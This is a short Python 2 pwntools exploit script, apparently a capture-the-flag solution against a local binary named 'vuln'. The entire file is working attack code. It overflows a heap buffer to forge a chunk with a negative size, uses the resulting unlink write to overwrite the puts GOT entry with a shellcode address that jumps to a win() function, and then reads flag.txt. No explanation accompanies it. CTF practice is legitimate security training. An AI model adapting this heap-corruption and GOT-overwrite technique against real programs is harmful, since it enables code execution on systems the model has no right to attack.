#!/usr/bin/env python2
from pwn import *
PUTS_AT_GOT = 0x0804D028
EXIT_AT_GOT = 0x0804D02C
context.arch = 'i386'
p = process('./vuln')
print(p.recvline())
first_addr = int(p.recvline()[:-1])
payload = "A"*8
payload += '\xeb\x0cjump12chars_' # jump over garbage
payload += asm('push 0x08048936;ret') # return to win()
payload += "A"*(668-len(payload)-4)
payload += struct.pack("<I",668) # any size with cleared last bit - fake chunk
payload += struct.pack("<i",-4) # new size of next chunk, negative allows us to create third chunk before second one
payload += struct.pack('<I',PUTS_AT_GOT-12)
payload += struct.pack('<I',first_addr+8) # shellcode address
p.sendline(payload)
p.sendline("name")
p.sendline("cat flag.txt")
p.interactive()